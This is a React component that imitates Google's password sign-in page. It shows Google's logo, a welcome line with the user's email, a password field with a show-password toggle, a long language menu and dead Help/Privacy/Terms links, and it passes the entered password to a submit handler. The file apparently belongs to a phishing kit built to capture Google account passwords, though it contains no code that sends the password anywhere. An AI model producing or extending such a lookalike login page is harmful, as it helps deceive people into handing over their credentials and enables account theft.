import React, { useState } from 'react';
import socialLogo from './googlepage/social.png';
import './GooglePopup.css';

const GooglePasswordForm = ({ onSubmit, email }) => {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (password.trim()) {
      onSubmit(password);
    }
  };

  const togglePassword = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="main_container">
      <div className="inner_container">
        <img src={socialLogo} alt="Google logo" id="inner_logo" />
        <div className="inner_head">
          <span id="Welcome">Welcome</span>
          <span id="email">{email}</span>
        </div>


        <div className="email_input">
          <form className="emailForm" onSubmit={handleSubmit}>
            <input
                type={showPassword ? "text" : "password"}
                name="password"
                placeholder="Enter Your password"
                id="typepass"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
            />
            <div className="showPassword">
              <input
              type="checkbox"
              id="showPassword"
              checked={showPassword}
              onChange={togglePassword}
          />
            <label className="show" htmlFor="showPassword">Show password</label>
              </div>
          </form>
        </div>

        <div className="buttonS">
          <div>
            <button id="Create" type="button">Forgot password?</button>
          </div>
          <div>
            <button id="next" type="submit" onClick={handleSubmit}>Next</button>
            </div>
          </div>

      </div>

      <div className="inner_footer">
        <div>
          <select name="language_bar" id="language" defaultValue="English (United States)">
            <option value="azərbaycan">azərbaycan</option>
            <option value="bosanski">bosanski</option>
            <option value=" català"> català</option>
            <option value=" Čeština"> Čeština</option>
            <option value=" Cymraeg"> Cymraeg</option>
            <option value=" Dansk"> Dansk</option>
            <option value="Deutsch">Deutsch</option>
            <option value=" eesti"> eesti</option>
            <option value="  Español (España)"> Español (España)</option>
            <option value="English (United States)">English (United States)</option>
            <option value="  English (United Kingdom)"> English (United Kingdom)</option>
            <option value=" Español (Latinoamérica)"> Español (Latinoamérica)</option>
            <option value="  euskara"> euskara</option>
            <option value="  Filipino"> Filipino</option>
            <option value="Français (Canada)">Français (Canada)</option>
            <option value=" Français (France)"> Français (France)</option>
            <option value="Gaeilge">Gaeilge</option>
            <option value="galego">galego</option>
            <option value=" Hrvatski"> Hrvatski</option>
            <option value="Indonesia">Indonesia</option>
            <option value="isiZulu">isiZulu</option>
            <option value=" íslenska"> íslenska</option>
            <option value="Italiano"> Italiano</option>
            <option value="Kiswahili">Kiswahili</option>
            <option value="latviešu">latviešu</option>
            <option value=" lietuvių"> lietuvių</option>
            <option value=" magyar"> magyar</option>
            <option value="  Melayu"> Melayu</option>
            <option value="   Nederlands"> Nederlands</option>
            <option value="norsk">norsk</option>
            <option value="o‘zbek">o‘zbek</option>
            <option value="  polski"> polski</option>
            <option value=" Português (Brasil)"> Português (Brasil)</option>
            <option value=" Português (Portugal)"> Português (Portugal)</option>
            <option value="română">română</option>
            <option value=" shqip"> shqip</option>
            <option value="Slovenčina">Slovenčina</option>
            <option value="    slovenščina"> slovenščina</option>
            <option value="  srki (latinica)ps"> srki (latinica)ps</option>
            <option value="Suomi">Suomi</option>
            <option value=" Svenska"> Svenska</option>
            <option value="  Tiếng Việt"> Tiếng Việt</option>
            <option value="Türkçe">Türkçe</option>
            <option value="Ελληνικά">Ελληνικά</option>
            <option value="беларуская">беларуская</option>
            <option value=" български"> български</option>
            <option value="кыргызча">кыргызча</option>
            <option value="  қазақ тілі"> қазақ тілі</option>
            <option value=" македонски"> македонски</option>
            <option value="монгол">монгол</option>
            <option value="Русский">Русский</option>
            <option value="српски (ћирилица)">српски (ћирилица)</option>
            <option value=" Українська"> Українська</option>
            <option value=" ქართული"> ქართული</option>
            <option value=" հայերեն"> հայերեն</option>
            <option value="‫עברית">‫עברית</option>
            <option value="‫اردو">‫اردو</option>
            <option value="‫العربية‬‎">‫العربية‬‎</option>
            <option value="‫فارسی‬‎">‫فارسی‬‎</option>
            <option value=" አማርኛ"> አማርኛ</option>
            <option value=" नेपाली"> नेपाली</option>
            <option value=" मराठी"> मराठी</option>
            <option value=" हिन्दी"> हिन्दी</option>
          </select>
        </div>

        <div id="footer_links">
          <a href="#">Help</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
        </div>
      </div>
    </div>
  );
};

export default GooglePasswordForm;
